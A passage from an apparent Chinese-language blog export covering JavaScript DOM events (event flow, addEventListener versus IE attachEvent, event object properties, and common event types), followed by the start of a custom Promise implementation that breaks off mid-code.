<h4 id="js获取DOM元素添加事件属性"><a href="#js获取DOM元素添加事件属性" class="headerlink" title="js获取DOM元素添加事件属性"></a>js获取DOM元素添加事件属性</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'box'</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用-addEventListener"><a href="#使用-addEventListener" class="headerlink" title="使用 addEventListener()"></a>使用 addEventListener()</h4><p><br>第一种方法，HTML内联属性绑定事件的方式不推荐，这违反了最佳实践。第二种方法的缺点是，只能同时给事件绑定一个callback，所以推荐一直使用 addEventListener() 方法给元素绑定事件<br></p>

<p><br>如果要移除一个通过 addEventListener 添加的事件处理函数，那么给 removeEventListener 传递的两个参数必须与 addEventListener 的前两个参数完全相同。这意味着，给一个元素绑定匿名事件处理函数将无法被移除<br></p>

<h2 id="二、事件流"><a href="#二、事件流" class="headerlink" title="二、事件流"></a>二、事件流</h2><h4 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h4><p>页面中接收事件的顺序。分为三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段</p>
<h4 id="事件冒泡"><a href="#事件冒泡" class="headerlink" title="事件冒泡"></a>事件冒泡</h4><p>事件首先由嵌套层次最深的节点接收，然后沿DOM树依次逐级向父代节点传播。</p>
<h4 id="事件捕获"><a href="#事件捕获" class="headerlink" title="事件捕获"></a>事件捕获</h4><p>不太具体的节点(或嵌套层次最浅的节点，通常是document)应该最先接收事件，然后沿DOM树依次向子代节点传递直到一个具体的子节点</p>
<h2 id="三、绑定事件的方法"><a href="#三、绑定事件的方法" class="headerlink" title="三、绑定事件的方法"></a>三、绑定事件的方法</h2><h4 id="标准方法"><a href="#标准方法" class="headerlink" title="标准方法"></a>标准方法</h4><h6 id="el-addEventListener-eventName-handle-useCapture"><a href="#el-addEventListener-eventName-handle-useCapture" class="headerlink" title="el.addEventListener(eventName, handle, useCapture)"></a>el.addEventListener(eventName, handle, useCapture)</h6><ul>
<li><p>描述：给DOM元素添加指定的事件处理函数</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} eventName</code> 事件名称</li>
<li><code>{Function} handle</code> 事件函数</li>
<li><code>{Boolean} useCapture</code> 是否在事件捕获阶段触发事件，true 代表捕获阶段触发，false 代表在冒泡阶段触发</li>
</ul>
</li>
</ul>
<h6 id="el-removeEventListener-eventName-handle"><a href="#el-removeEventListener-eventName-handle" class="headerlink" title="el.removeEventListener(eventName, handle)"></a>el.removeEventListener(eventName, handle)</h6><ul>
<li><p>描述：移除通过 addEventListener 添加的事件处理函数</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} eventName</code> 事件名称</li>
<li><code>{Function} handle</code> 事件函数</li>
</ul>
</li>
</ul>
<p class="tip"><br>如果要移除一个通过 addEventListener 添加的事件处理函数，那么给 removeEventListener 传递的两个参数必须与 addEventListener 的前两个参数完全相同。这意味着，给一个元素绑定匿名事件处理函数将无法被移除<br></p>

<h4 id="IE8及以下"><a href="#IE8及以下" class="headerlink" title="IE8及以下"></a>IE8及以下</h4><p>addEventListener 和 removeEventListener 在IE8及以下不被支持</p>
<h6 id="el-attachEvent-eventName-handle"><a href="#el-attachEvent-eventName-handle" class="headerlink" title="el.attachEvent(eventName, handle)"></a>el.attachEvent(eventName, handle)</h6><ul>
<li><p>描述：给DOM元素添加指定的事件处理函数</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} eventName</code> 事件名称</li>
<li><code>{Function} handle</code> 事件函数</li>
</ul>
</li>
</ul>
<h6 id="el-detachEvent-eventName-handle"><a href="#el-detachEvent-eventName-handle" class="headerlink" title="el.detachEvent(eventName, handle)"></a>el.detachEvent(eventName, handle)</h6><ul>
<li><p>描述：移除通过 addEventListener 添加的事件处理函数</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} eventName</code> 事件名称</li>
<li><code>{Function} handle</code> 事件函数</li>
</ul>
</li>
</ul>
<h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><p>attachEvent/detachEvent 与 addEventListener/removeEventListener 的区别：</p>
<ul>
<li>由于IE8不支持事件捕获，所以通过 attachEvent/detachEvent 绑定的时间也只能在冒泡阶段触发</li>
<li>通过 attachEvent/detachEvent 绑定的事件函数会在全局作用域中运行，即： this === window</li>
<li>通过 attachEvent/detachEvent 绑定的事件函数以绑定时的先后顺序倒序被执行</li>
<li>attachEvent/detachEvent 的第一个参数要在事件名称前面加 ‘on’</li>
</ul>
<h2 id="四、事件对象"><a href="#四、事件对象" class="headerlink" title="四、事件对象"></a>四、事件对象</h2><h4 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h4><h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><h6 id="event-bubbles"><a href="#event-bubbles" class="headerlink" title="event.bubbles"></a>event.bubbles</h6><ul>
<li>读写特性：只读</li>
<li>描述：表示事件是否冒泡</li>
</ul>
<h6 id="event-cancelable"><a href="#event-cancelable" class="headerlink" title="event.cancelable"></a>event.cancelable</h6><ul>
<li>读写特性：只读</li>
<li>描述：表示事件是否可以取消事件默认行为</li>
</ul>
<h6 id="event-currentTarget"><a href="#event-currentTarget" class="headerlink" title="event.currentTarget"></a>event.currentTarget</h6><ul>
<li>读写特性：只读</li>
<li>描述：currentTarget的值始终等于 this，即指向事件所绑定到的元素</li>
</ul>
<h6 id="event-target"><a href="#event-target" class="headerlink" title="event.target"></a>event.target</h6><ul>
<li>读写特性：只读</li>
<li>描述：真正触发事件的元素</li>
</ul>
<h6 id="event-defaultPrevented"><a href="#event-defaultPrevented" class="headerlink" title="event.defaultPrevented"></a>event.defaultPrevented</h6><ul>
<li>读写特性：只读</li>
<li>描述：为 true 表示已经调用了 preventDefault()</li>
</ul>
<h6 id="event-detail"><a href="#event-detail" class="headerlink" title="event.detail"></a>event.detail</h6><ul>
<li>读写特性：只读</li>
<li>描述：与事件相关的细节信息</li>
</ul>
<h6 id="event-eventPhase"><a href="#event-eventPhase" class="headerlink" title="event.eventPhase"></a>event.eventPhase</h6><ul>
<li>读写特性：只读</li>
<li>描述：调用该事件处理函数的阶段 <code>1</code> 表示捕获阶段 <code>2</code> 表示处于目标阶段 <code>3</code> 表示冒泡阶段</li>
</ul>
<h6 id="event-trusted"><a href="#event-trusted" class="headerlink" title="event.trusted"></a>event.trusted</h6><ul>
<li>读写特性：只读</li>
<li>描述：为true表示事件是由浏览器生成的，false表示事件是由人工使用JavaScript创建的</li>
</ul>
<h6 id="event-type"><a href="#event-type" class="headerlink" title="event.type"></a>event.type</h6><ul>
<li>读写特性：只读</li>
<li>描述：事件类型</li>
</ul>
<h6 id="event-type-1"><a href="#event-type-1" class="headerlink" title="event.type"></a>event.type</h6><ul>
<li>读写特性：只读</li>
<li>描述：事件类型</li>
</ul>
<h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><h6 id="event-preventDefault"><a href="#event-preventDefault" class="headerlink" title="event.preventDefault()"></a>event.preventDefault()</h6><ul>
<li>描述：阻止事件的默认行为</li>
</ul>
<p>只有 event.cancelable 属性为 true 的事件，才能够通过 preventDefault() 方法取消默认行为</p>

<h6 id="event-stopImmediatePropagation"><a href="#event-stopImmediatePropagation" class="headerlink" title="event.stopImmediatePropagation()"></a>event.stopImmediatePropagation()</h6><ul>
<li>描述：与 event.stopPropagation() 一样，可以阻止事件冒泡，除此之外，还能阻止执行该语句之后的所有事件监听</li>
</ul>
<h4 id="IE特有"><a href="#IE特有" class="headerlink" title="IE特有"></a>IE特有</h4><h6 id="IE中获取事件对象的方法"><a href="#IE中获取事件对象的方法" class="headerlink" title="IE中获取事件对象的方法"></a>IE中获取事件对象的方法</h6><p class="tip">IE中获取事件对象的方法与绑定事件的方式有关</p>

<p>1、DOM0级绑定事件的方式，即 <code>el.onclick = function () {}</code>，其事件对象通过window获取：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">el.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.event</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、DOM2级绑定事件对象的方式，即 <code>el.attachEvent(&#39;click&#39;, function (event) {})</code>，既可以通过window获取，也可以通过event参数获取：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">el.attachEvent(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.event</span><br><span class="line">    <span class="comment">// 或</span></span><br><span class="line">    event</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h5 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h5><h6 id="event-srcElement"><a href="#event-srcElement" class="headerlink" title="event.srcElement"></a>event.srcElement</h6><ul>
<li>读写特性：只读</li>
<li>描述：与规范中的 event.target 属性相同。</li>
</ul>
<h6 id="event-returnValue"><a href="#event-returnValue" class="headerlink" title="event.returnValue"></a>event.returnValue</h6><ul>
<li>读写</li>
<li>描述：默认为 <code>true</code>，如果将其设为 <code>false</code> 即可取消事件默认行为，相当于规范中的：<code>event.preventDefault()</code></li>
</ul>
<h6 id="event-cancelBubble"><a href="#event-cancelBubble" class="headerlink" title="event.cancelBubble"></a>event.cancelBubble</h6><ul>
<li>读写</li>
<li>描述：默认为 <code>false</code> ，如果设为 <code>true</code> 即可取消事件冒泡，相当于规范中的：<code>event.stopPropagation()</code></li>
</ul>
<h4 id="事件总结"><a href="#事件总结" class="headerlink" title="事件总结"></a>事件总结</h4><p class="tip"><br>在规范中，事件处理函数的this对象始终等于 event.currentTarget 属性，但在IE中就不一定。比如：使用 attachEvent 绑定的事件处理函数是在全局作用域中运行的，所以this对象指向window，而不是 event.srcElement<br></p>

<h6 id="对照表"><a href="#对照表" class="headerlink" title="对照表"></a>对照表</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| standard          | IE                    |</span><br><span class="line">| -------------     | -------------         |</span><br><span class="line">| target            | srcElement            |</span><br><span class="line">| preventDefault()  | returnValue = false   |</span><br><span class="line">| stopPropagation() | cancelBubble = true   |</span><br></pre></td></tr></table></figure>
<h2 id="五、事件类型及讲解"><a href="#五、事件类型及讲解" class="headerlink" title="五、事件类型及讲解"></a>五、事件类型及讲解</h2><h4 id="UI事件"><a href="#UI事件" class="headerlink" title="UI事件"></a>UI事件</h4><h6 id="load"><a href="#load" class="headerlink" title="load"></a>load</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window上触发：</span><br><span class="line">    当页面完全加载完，包括所有图像、js文件、css文件、&lt;object&gt;内嵌对象等等</span><br><span class="line">&lt;img&gt;图片：</span><br><span class="line">    当图片加载完成后触发</span><br><span class="line">&lt;script&gt;/&lt;link&gt;：</span><br><span class="line">    当js文件或css文件加载成功后</span><br><span class="line">    注意：&lt;script&gt;标签只能使用HTML内联属性添加事件的方式才能生效</span><br></pre></td></tr></table></figure>
<h6 id="resize"><a href="#resize" class="headerlink" title="resize"></a>resize</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window上触发：</span><br><span class="line">    当窗口大小改变时</span><br></pre></td></tr></table></figure>
<h6 id="scroll"><a href="#scroll" class="headerlink" title="scroll"></a>scroll</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window上触发：</span><br><span class="line">    当滚动页面时</span><br><span class="line">在可滚动元素上触发：</span><br><span class="line">    当滚动可滚动的元素时</span><br></pre></td></tr></table></figure>
<h4 id="焦点事件"><a href="#焦点事件" class="headerlink" title="焦点事件"></a>焦点事件</h4><h6 id="focus"><a href="#focus" class="headerlink" title="focus"></a>focus</h6><p>当元素获得焦点时触发，不冒泡，但是可以在捕获阶段触发</p>
<h6 id="blur"><a href="#blur" class="headerlink" title="blur"></a>blur</h6><p>当元素失去焦点时触发，不冒泡，但是可以在捕获阶段触发</p>
<h4 id="鼠标与滚轮事件"><a href="#鼠标与滚轮事件" class="headerlink" title="鼠标与滚轮事件"></a>鼠标与滚轮事件</h4><h6 id="click"><a href="#click" class="headerlink" title="click"></a>click</h6><p>点击鼠标左键时触发</p>
<h6 id="dblclick"><a href="#dblclick" class="headerlink" title="dblclick"></a>dblclick</h6><p>双击鼠标左键</p>
<h6 id="mousedown"><a href="#mousedown" class="headerlink" title="mousedown"></a>mousedown</h6><p>按下鼠标任意按钮时触发</p>
<h6 id="mouseup"><a href="#mouseup" class="headerlink" title="mouseup"></a>mouseup</h6><p>释放鼠标按钮时触发</p>
<h6 id="mouseenter-mouseleave-与-mouseover-mouseout-的区别"><a href="#mouseenter-mouseleave-与-mouseover-mouseout-的区别" class="headerlink" title="mouseenter/mouseleave 与 mouseover/mouseout 的区别"></a>mouseenter/mouseleave 与 mouseover/mouseout 的区别</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mouseenter 只会在鼠标在元素外部进入元素内部时触发，如果该元素有子节点，当移入其子节点内部时，会在捕获阶段在该节点触发，当鼠标再从子节点移出到该节点时，不会再触发。</span><br><span class="line"></span><br><span class="line">父元素绑定事件，子元素溢出父元素，括号的数字代表 event.eventPhase 的值</span><br><span class="line">1、先移入子元素</span><br><span class="line">    mouseover: 事件在捕获阶段触发一次（1）</span><br><span class="line">    mouseenter: Firefox、chrome 先在 处于目标阶段触发一次 再在 捕获阶段触发一次（2-1）</span><br><span class="line">                Safari 先在 捕获阶段触发 再在 处于目标阶段触发 （1-2）</span><br><span class="line"></span><br><span class="line">1.2、从子元素直接移出到父元素</span><br><span class="line">    mouseover: 事件在处于目标阶段触发（2）</span><br><span class="line">    mouseenter: 不触发事件</span><br><span class="line"></span><br><span class="line">1.3、再从父元素直接移动到子元素</span><br><span class="line">    mouseover: 在捕获阶段触发（1）</span><br><span class="line">    mouseenter: 在捕获阶段触发（1）</span><br><span class="line"></span><br><span class="line">2、先移入父元素</span><br><span class="line">    mouseover: 在处于目标阶段触发（2）</span><br><span class="line">    mouseenter: 在处于目标阶段触发（2）</span><br><span class="line"></span><br><span class="line">2.1、再从父元素直接移动到子元素</span><br><span class="line">    mouseover: 在捕获阶段触发（1）</span><br><span class="line">    mouseenter: 在捕获阶段触发（1）</span><br><span class="line"></span><br><span class="line">总结：</span><br><span class="line">    大前提：父元素绑定事件，子元素溢出父元素。如果只考虑在目标阶段触发的话，即 event.eventPhase 的值为2时，不妨把子元素覆盖的区域当做附加区，那么：</span><br><span class="line"></span><br><span class="line">    mouseover触发时机: 鼠标从外部移入该元素，或从附加区移入该元素</span><br><span class="line">    mouseout触发时机: 鼠标从该元素移到外部，或从该元素移到附加区</span><br><span class="line"></span><br><span class="line">    mouseenter触发时机: 鼠标从外部移入附加区，或从外部移入该元素</span><br><span class="line">    mouseleave触发时机: 鼠标从附加区移入外部，或从该元素移入外部</span><br><span class="line"></span><br><span class="line">    mouseover 和 mouseout 的作用区域 = 该元素区域 - (该元素 与 附加区交集)</span><br><span class="line">    mouseenter 和 mouseleave 的作用区域 = 该元素区域 和 附加区并集</span><br><span class="line"></span><br><span class="line">    mouseover 先于 mouseenter</span><br><span class="line">    mouseout 先于 mouseleave</span><br><span class="line"></span><br><span class="line">    鼠标事件 只有 mouseenter 和 mouseleave 不冒泡（但是可以在捕获阶段触发）</span><br><span class="line"></span><br><span class="line">mouseover 和 mouseout 的相关元素：</span><br><span class="line">    1、标准</span><br><span class="line">        event.relatedTarget</span><br><span class="line">    2、IE8及以下</span><br><span class="line">        event.fromElement</span><br><span class="line">        event.toElement</span><br></pre></td></tr></table></figure>
<h6 id="鼠标事件对象中的位置信息："><a href="#鼠标事件对象中的位置信息：" class="headerlink" title="鼠标事件对象中的位置信息："></a>鼠标事件对象中的位置信息：</h6><ul>
<li><p>客户区坐标位置</p>
<p>  event.clientX/Y</p>
</li>
<li><p>页面坐标位置</p>
<p>  event.pageX/Y</p>
  <p class="tip"><br>  注意：IE8及以下版本不支持 pageX/Y，不过可以通过 clientX/Y + scrollLeft/Top 计算<br>  </p>
</li>
<li><p>屏幕坐标位置（相对电脑屏幕的坐标位置）</p>
<p>  event.screenX/Y</p>
</li>
</ul>
<h6 id="修改键"><a href="#修改键" class="headerlink" title="修改键"></a>修改键</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event.shiftKey		// 按住 shift 键为true</span><br><span class="line">event.ctrlKey		// 按住 Ctrl 键为true</span><br><span class="line">event.altKey		// 按住 alt 键为true</span><br><span class="line">event.metaKey		// Mac下按住 command 键为true，windows 按住 Windows 键为true</span><br></pre></td></tr></table></figure>
<p class="tip">注意：IE8及以下不支持 metaKey</p>

<h4 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h4><h6 id="keydown"><a href="#keydown" class="headerlink" title="keydown"></a>keydown</h6><p>按下键盘任意键时触发</p>
<h6 id="keypress"><a href="#keypress" class="headerlink" title="keypress"></a>keypress</h6><p>按下键盘任意字符键时触发</p>
<h6 id="keyup"><a href="#keyup" class="headerlink" title="keyup"></a>keyup</h6><p>松开键盘任意键时触发</p>
<p class="tip">可以通过 event.keyCode 获取键码</p>

<h4 id="文本事件"><a href="#文本事件" class="headerlink" title="文本事件"></a>文本事件</h4><h6 id="textInput"><a href="#textInput" class="headerlink" title="textInput"></a>textInput</h6><p>输入框，文本在插入输入框之前触发，<code>event.data</code> 按下的字符</p>
<h4 id="HTML5事件"><a href="#HTML5事件" class="headerlink" title="HTML5事件"></a>HTML5事件</h4><h6 id="contextmenu"><a href="#contextmenu" class="headerlink" title="contextmenu"></a>contextmenu</h6><p>鼠标右键事件，常用于制定自定义菜单</p>
<h6 id="beforeunload"><a href="#beforeunload" class="headerlink" title="beforeunload"></a>beforeunload</h6><p>在页面卸载之前触发，用来询问用户是否真的要离开该页面</p>
<p class="tip">该事件在window上触发，调用此方法的必须将 提示信息设置为 event.returnValue 的值，并return 该值</p>

<ul>
<li>示例：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'beforeunload'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.returnValue = <span class="string">'what?'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'what?'</span></span><br><span class="line">&#125;, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
<h6 id="DOMcontentLoaded"><a href="#DOMcontentLoaded" class="headerlink" title="DOMcontentLoaded"></a>DOMcontentLoaded</h6><p>形成完整DOM树之后触发</p>
<p class="tip">注意：IE8及以下不支持</p>

<h6 id="pageshow"><a href="#pageshow" class="headerlink" title="pageshow"></a>pageshow</h6><p>页面显示时触发，<code>load</code> 事件只会在第一次加载页面是触发，之后页面会被 <code>bfcache</code>（往返缓存）管理，通过前进后退按钮来显示页面时，<code>load</code> 事件并不会触发，但是 <code>pageshow</code> 事件会触发</p>
<h6 id="pagehide"><a href="#pagehide" class="headerlink" title="pagehide"></a>pagehide</h6><p>页面卸载时触发。</p>
<p class="tip">注意：pageshow/pagehide 必须添加到 window对象上</p>

<h6 id="hashchange"><a href="#hashchange" class="headerlink" title="hashchange"></a>hashchange</h6><p><code>#</code> 号后面的字符串发生变化时，在window对象上触发。</p>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>DOM</tag>
        <tag>事件</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA-Promise源码</title>
    <url>/2019/08/08/ECMA-promise%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<p>背景，本篇文章主要在于探究 Promise 的实现原理，带领大家一步一步实现一个 Promise , 不对其用法做说明，如果读者还对Promise的用法不了解，可以查看阮一峰老师的</p>
<h2 id="源码如下"><a href="#源码如下" class="headerlink" title="源码如下"></a>源码如下</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> executeAsync;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> process === <span class="string">'object'</span> &amp;&amp; process.nextTick) &#123;</span><br><span class="line">    executeAsync = process.nextTick;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> setImmediate === <span class="string">'function'</span>) &#123;</span><br><span class="line">    executeAsync = setImmediate;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    executeAsync = <span class="function"><span class="keyword">function</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">        setTimeout(fn, <span class="number">0</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callAsync</span>(<span class="params">fn, arg, callback, onError</span>) </span>&#123;</span><br><span class="line">    executeAsync(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            callback ? callback(fn(arg)) : fn(arg);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            onError(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断变量否为function</span></span><br><span class="line"><span class="keyword">const</span> isFunction = <span class="function"><span class="params">variable</span> =&gt;</span> <span class="keyword">typeof</span> variable === <span class="string">'function'</span>;</span><br><span class="line"><span class="comment">// 定义Promise的三种状态常量</span></span><br><span class="line"><span class="keyword">const</span> PENDING = <span class="string">'pending'</span>;</span><br><span class="line"><span class="keyword">const</span> FULFILLED = <span class="string">'fulfilled'</span>;</span><br><span class="line"><span class="keyword">const</span> REJECTED = <span class="string">'rejected'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(handle) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isFunction(handle)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'MyPromise must accept a function as a parameter'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 添加状态</span></span><br><span class="line">        <span class="keyword">this</span>._status = PENDING;</span><br><span class="line">        <span class="comment">// 添加状态</span></span><br><span class="line">        <span class="keyword">this</span>._value = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 添加成功回调函数队列</span></span><br><span class="line">        <span class="keyword">this</span>._fulfilledQueue = [];</span><br><span class="line">        <span class="comment">// 添加失败回调函数队列</span></span><br><span class="line">        <span class="keyword">this</span>._rejectedQueue = [];</span><br><span class="line">        <span class="comment">// 执行handle</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            handle(<span class="keyword">this</span>._resolve.bind(<span class="keyword">this</span>), <span class="keyword">this</span>._reject.bind(<span class="keyword">this</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">this</span>._reject(err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加resovle时执行的函数</span></span><br><span class="line">    _resolve(val) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>._status !== PENDING) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">this</span>._status = FULFILLED;</span><br><span class="line">        <span class="comment">// 依次执行成功队列中的函数，并清空队列</span></span><br><span class="line">        <span class="keyword">const</span> runFulfilled = <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> cb;</span><br><span class="line">            cb = <span class="keyword">this</span>._fulfilledQueue.shift();</span><br><span class="line">            <span class="keyword">while</span> (cb) &#123;</span><br><span class="line">                cb(value);</span><br><span class="line">                cb = <span class="keyword">this</span>._fulfilledQueue.shift();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 依次执行失败队列中的函数，并清空队列</span></span><br><span class="line">        <span class="keyword">const</span> runRejected = <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> cb;</span><br><span class="line">            cb = <span class="keyword">this</span>._rejectedQueue.shift();</span><br><span class="line">            <span class="keyword">while</span> (cb) &#123;</span><br><span class="line">                cb(error);</span><br><span class="line">                cb = <span class="keyword">this</span>._rejectedQueue.shift();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">/* 如果resolve的参数为Promise对象，则必须等待该Promise对象状态改变后,</span></span><br><span class="line"><span class="comment">          当前Promsie的状态才会改变，且状态取决于参数Promsie对象的状态</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (val <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">            val.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>._value = value;</span><br><span class="line">                runFulfilled(value);</span><br><span class="line">            &#125;, err =&gt; &#123;</span><br><span class="line">                <span class="keyword">this</span>._value = err;</span><br><span class="line">                runRejected(err);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>._value = val;</span><br><span class="line">            runFulfilled(val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加reject时执行的函数</span></span><br><span class="line">    _reject(err) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>._status !== PENDING) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 依次执行失败队列中的函数，并清空队列</span></span><br><span class="line">        <span class="keyword">this</span>._status = REJECTED;</span><br><span class="line">        <span class="keyword">this</span>._value = err;</span><br><span class="line">        <span class="keyword">let</span> cb;</span><br><span class="line">        cb = <span class="keyword">this</span>._rejectedQueue.shift();</span><br><span class="line">        <span class="keyword">while</span> (cb) &#123;</span><br><span class="line">            cb(err);</span><br><span class="line">            cb = <span class="keyword">this</span>._rejectedQueue.shift();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加then方法</span></span><br><span class="line">    then(onFulfilled, onRejected) &#123;</span><br><span class="line">        <span class="comment">// 返回一个新的Promise对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">onFulfilledNext, onRejectedNext</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 封装一个成功时执行的函数</span></span><br><span class="line">            <span class="keyword">let</span> fulfilled = <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isFunction(onFulfilled)) &#123;</span><br><span class="line">                    callAsync(onFulfilled, value, res =&gt; &#123;</span><br><span class="line">                        <span class="keyword">if</span> (res <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                            <span class="comment">// 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调</span></span><br><span class="line">                            res.then(onFulfilledNext, onRejectedNext);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// 否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数</span></span><br><span class="line">                            onFulfilledNext(res);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, onRejectedNext);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        onFulfilledNext(value);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                        <span class="comment">// 如果函数执行出错，新的Promise对象的状态为失败</span></span><br><span class="line">                        onRejectedNext(err);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 封装一个失败时执行的函数</span></span><br><span class="line">            <span class="keyword">let</span> rejected = <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isFunction(onRejected)) &#123;</span><br><span class="line">                    callAsync(onRejected, error, res =&gt; &#123;</span><br><span class="line">                        <span class="keyword">if</span> (res <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                            <span class="comment">// 如果当前回调函数返回MyPromise对象，必须等待其状态改变后在执行下一个回调</span></span><br><span class="line">                            res.then(onFulfilledNext, onRejectedNext);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// 否则会将返回结果直接作为参数，传入下一个then的回调函数，并立即执行下一个then的回调函数</span></span><br><span class="line">                            onFulfilledNext(res);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, onRejectedNext);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        onRejectedNext(error);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                        <span class="comment">// 如果函数执行出错，新的Promise对象的状态为失败</span></span><br><span class="line">                        onRejectedNext(err);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (<span class="keyword">this</span>._status) &#123;</span><br><span class="line">                <span class="comment">// 